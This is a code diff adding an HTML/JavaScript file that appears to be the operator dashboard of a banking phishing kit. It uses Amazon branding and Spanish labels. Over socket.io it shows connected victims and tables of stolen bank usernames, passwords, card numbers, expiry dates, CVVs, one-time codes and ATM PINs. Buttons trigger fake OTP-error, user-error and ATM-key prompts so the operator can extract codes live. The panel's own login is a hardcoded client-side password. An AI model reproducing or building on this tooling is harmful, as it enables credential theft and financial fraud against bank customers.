@@ -1,0 +1,377 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Admin Panel</title>
+    <link href="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css" rel="stylesheet">
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
+    <style>
+        body {
+            font-family: 'Roboto', sans-serif;
+            margin: 0;
+            padding: 0;
+            background: url('amazonico1.jpg') no-repeat center center fixed;
+            background-size: cover;
+            color: #e0e0e0;
+            transition: background-color 0.5s, color 0.5s;
+        }
+        .sidebar {
+            height: 100%;
+            width: 250px;
+            position: fixed;
+            top: 0;
+            left: 0;
+            background-color: #333;
+            overflow-x: hidden;
+            transition: 0.5s;
+            padding-top: 60px;
+        }
+        .sidebar a {
+            padding: 10px 15px;
+            text-decoration: none;
+            font-size: 18px;
+            color: #e0e0e0;
+            display: block;
+            transition: 0.3s;
+        }
+        .sidebar a:hover {
+            background-color: #575757;
+        }
+        .sidebar .closebtn {
+            position: absolute;
+            top: 0;
+            right: 25px;
+            font-size: 36px;
+            margin-left: 50px;
+        }
+        #main {
+            transition: margin-left 0.5s;
+            padding: 16px;
+            margin-left: 250px;
+        }
+        .openbtn {
+            font-size: 20px;
+            cursor: pointer;
+            background-color: #333;
+            color: white;
+            padding: 10px 15px;
+            border: none;
+            border-radius: 48%;
+        }
+        .theme-switch {
+            position: fixed;
+            top: 20px;
+            right: 20px;
+            display: flex;
+            align-items: center;
+        }
+        .theme-switch input {
+            display: none;
+        }
+        .theme-switch label {
+            cursor: pointer;
+            width: 50px;
+            height: 25px;
+            background-color: #ccc;
+            display: flex;
+            align-items: center;
+            border-radius: 25px;
+            position: relative;
+            transition: background-color 0.3s;
+        }
+        .theme-switch label::after {
+            content: '';
+            width: 21px;
+            height: 21px;
+            background-color: white;
+            border-radius: 50%;
+            position: absolute;
+            top: 2px;
+            left: 2px;
+            transition: left 0.3s;
+        }
+        .theme-switch input:checked + label {
+            background-color: #4caf50;
+        }
+        .theme-switch input:checked + label::after {
+            left: 27px;
+        }
+        .list-group-item {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 10px;
+            margin: 10px 0;
+            background-color: #444;
+        }
+        .btn {
+            margin-left: 5px;
+        }
+        .btn .fas {
+            color: #fff;
+        }
+        table {
+            margin: 20px auto;
+            width: 100%;
+            border-collapse: collapse;
+        }
+        th, td {
+            padding: 10px;
+            border: 1px solid #444;
+        }
+        th {
+            background-color: #333;
+            color: #e0e0e0;
+        }
+        td {
+            background-color: #444;
+            color: #e0e0e0;
+        }
+        .light-mode {
+            background-color: #f4f4f4;
+            color: #333;
+        }
+        .light-mode .sidebar {
+            background-color: #fff;
+            color: #333;
+        }
+        .light-mode .sidebar a {
+            color: #333;
+        }
+        .light-mode .sidebar a:hover {
+            background-color: #ddd;
+        }
+        .light-mode .list-group-item {
+            background-color: #fff;
+        }
+        .light-mode th {
+            background-color: #f4f4f4;
+            color: #333;
+        }
+        .light-mode td {
+            background-color: #fff;
+            color: #333;
+        }
+        .light-mode .openbtn {
+            background-color: #fff;
+            color: #333;
+        }
+        .login-container {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+        .login-box {
+            background: url('amazonico.jpg') no-repeat center center;
+            background-size: cover;
+            padding: 20px;
+            border-radius: 8px;
+            width: 300px;
+            text-align: center;
+            color: #e0e0e0;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.5);
+        }
+        .login-box input {
+            width: 100%;
+            padding: 10px;
+            margin: 10px 0;
+            border: none;
+            border-radius: 4px;
+        }
+        .login-box button {
+            width: 100%;
+            padding: 10px;
+            border: none;
+            border-radius: 4px;
+            background-color: #4caf50;
+            color: #e0e0e0;
+            font-size: 16px;
+            cursor: pointer;
+        }
+    </style>
+</head>
+<body>
+    <!-- Login Form -->
+    <div id="login" class="login-container">
+        <div class="login-box">
+            <h2>AMAZON</h2>
+            <form id="login-form">
+                <input type="text" id="username" placeholder="Usuario" required>
+                <input type="password" id="password" placeholder="Clave" required>
+                <button type="submit">Entrar</button>
+                <p id="login-error" style="color: red; display: none;">Usuario o clave incorrectos.</p>
+            </form>
+        </div>
+    </div>
+
+    <!-- Admin Panel -->
+    <div id="admin-panel" style="display: none;">
+        <audio id="notification-sound" src="notify/Sales.m4a" preload="auto"></audio>
+        <div id="mySidebar" class="sidebar">
+            <a href="javascript:void(0)" class="closebtn" onclick="closeNav()">&times;</a>
+            <a href="#"><i class="fas fa-tachometer-alt"></i> Dashboard</a>
+            <a href="#"><i class="fas fa-users"></i> Clients</a>
+            <a href="#"><i class="fas fa-cog"></i> Settings</a>
+            <a href="#"><i class="fas fa-sign-out-alt"></i> Logout</a>
+        </div>
+
+        <div id="main">
+            <button class="openbtn" onclick="openNav()"><i class="fas fa-bars"></i></button>
+            <div class="theme-switch">
+                <input type="checkbox" id="theme-switch">
+                <label for="theme-switch"></label>
+            </div>
+            <h1>Admin Panel</h1>
+            <h2>Clients</h2>
+            <ul id="clients" class="list-group"></ul>
+
+            <h2>Informacion del cliente</h2>
+            <table id="info-table" class="table">
+                <tr>
+                    <th>Client ID</th>
+                    <th>Banco</th>
+                    <th>usuario</th>
+                    <th>Clave</th>
+                    <th>cCard</th>
+                    <th>Fecha</th>
+                    <th>CVV</th>
+                    <th>C-Dinámica</th>
+                    <th>Usuario</th>
+                    <th>Clave</th>
+                    <th>Clave Cajero</th>
+                </tr>
+            </table>
+        </div>
+    </div>
+
+    <script src="/socket.io/socket.io.js"></script>
+    <script>
+        const socket = io();
+        const sound = document.getElementById('notification-sound');
+        socket.on('sales-notify', () => {
+            sound.play();
+        });
+
+        socket.on('set-cookie', (sessionId) => {
+            document.cookie = `sessionId=${sessionId}; max-age=172800`; // Expira en 48 horas
+        });
+
+        const clientInfo = {};
+        
+        function sendMessage(clientId) {
+            socket.emit('send-message', { clientId });
+        }
+
+        function requestInfo(clientId) {
+            socket.emit('request-info', { clientId });
+        }
+
+        function requestOtpError(clientId) {
+            socket.emit('otp-error', { clientId });
+        }
+
+        function requestUserError(clientId) {
+            socket.emit('user-error', { clientId });
+        }
+
+        function requestAtmKey(clientId) {
+            console.log("Sending ATM key for client ID: " + clientId);
+            socket.emit('atm-key', { clientId });
+        }
+
+        function openNav() {
+            document.getElementById("mySidebar").style.width = "250px";
+            document.getElementById("main").style.marginLeft = "250px";
+        }
+
+        function closeNav() {
+            document.getElementById("mySidebar").style.width = "0";
+            document.getElementById("main").style.marginLeft = "0";
+        }
+
+        function updateClientList(clients) {
+            const clientsList = document.getElementById('clients');
+            clientsList.innerHTML = '';
+
+            for (var id in clients) {
+                const clientItem = document.createElement('li');
+                const client = clients[id];
+                clientItem.className = "list-group-item";
+                
+                const now = new Date();
+                const connectedAt = new Date(client.connectedAt);
+                let hours = connectedAt.getHours();
+                const ampm = hours >= 12 ? 'PM' : 'AM';
+                hours = hours % 12;
+                hours = hours ? hours : 12;
+
+                const formattedTime = `${hours}:${('0' + connectedAt.getMinutes()).slice(-2)} ${ampm}`;
+
+                clientItem.innerHTML = `
+                    <span><b>Client ID:</b> ${id !== socket.id ? client.name : 'ADMIN'}</span>
+                    <span class="badge badge-success" id="status-${id}">Conectado</span>
+                    <span class="badge badge-info">T. conexión: ${formattedTime}</span>
+                    <button class="btn btn-sm btn-primary" onclick="sendMessage('${id}')" data-toggle="tooltip" data-placement="top" title="ENVIAR A LATAM"><i class="fas fa-arrow-right"></i></button>
+                    <button class="btn btn-sm btn-success" onclick="requestInfo('${id}')" data-toggle="tooltip" data-placement="top" title="OTP"><i class="fas fa-key"></i></button>
+                    <button class="btn btn-sm btn-danger" onclick="requestOtpError('${id}')" data-toggle="tooltip" data-placement="top" title="OTP Error"><i class="fas fa-key"></i></button>
+                    <button class="btn btn-sm btn-info" onclick="requestUserError('${id}')" data-toggle="tooltip" data-placement="top" title="Usuario Error"><i class="fas fa-user-times"></i></button>
+                    <button class="btn btn-sm btn-warning" onclick="requestAtmKey('${id}')" data-toggle="tooltip" data-placement="top" title="Clave Cajero"><i class="fas fa-university"></i></button>
+                `;
+                clientsList.appendChild(clientItem);
+            }
+        }
+
+        socket.on('update-clients', (clients) => {
+            updateClientList(clients);
+        });
+
+        socket.on('receive-info', (data) => {
+            const table = document.getElementById('info-table');
+            const row = table.insertRow();
+            row.insertCell(0).innerHTML = data.namec;
+            row.insertCell(1).innerHTML = data.tbanco;
+            row.insertCell(2).innerHTML = data.tuser;
+            row.insertCell(3).innerHTML = data.tpass;
+            row.insertCell(4).innerHTML = data.cCard;
+            row.insertCell(5).innerHTML = data.fecha;
+            row.insertCell(6).innerHTML = data.CVV;
+            row.insertCell(7).innerHTML = data.info  !== "" ? data.info : `<button class="btn btn-sm btn-success" onclick="requestInfo('${data.clientId}')" data-toggle="tooltip" data-placement="top" title="OTP"><i class="fas fa-key"></i></button>`;
+            row.insertCell(8).innerHTML = data.user !== "" ? data.user : `<button class="btn btn-sm btn-info" onclick="requestUserError('${data.clientId}')" data-toggle="tooltip" data-placement="top" title="Usuario Error"><i class="fas fa-user-times"></i></button>`;
+            row.insertCell(9).innerHTML = data.upw;
+            row.insertCell(10).innerHTML = data.ccaj !== "" ? data.ccaj :  `<button class="btn btn-sm btn-warning" onclick="requestAtmKey('${data.clientId}')" data-toggle="tooltip" data-placement="top" title="Clave Cajero"><i class="fas fa-university"></i></button>`;
+        });
+
+        socket.on('client-disconnected', (clientId) => {
+            const statusBadge = document.getElementById(`status-${clientId}`);
+            if (statusBadge) {
+                statusBadge.className = 'badge badge-danger';
+                statusBadge.innerText = 'Desconectado';
+            }
+        });
+
+        const themeSwitch = document.getElementById('theme-switch');
+        themeSwitch.addEventListener('change', () => {
+            document.body.classList.toggle('light-mode');
+        });
+
+        // Login functionality
+        const validUsername = 'admin';
+        const validPassword = 'draka1010';
+
+        document.getElementById('login-form').addEventListener('submit', (event) => {
+            event.preventDefault();
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+
+            if (username === validUsername && password === validPassword) {
+                document.getElementById('login').style.display = 'none';
+                document.getElementById('admin-panel').style.display = 'block';
+            } else {
+                document.getElementById('login-error').style.display = 'block';
+            }
+        });
+    </script>
+</body>
+</html>
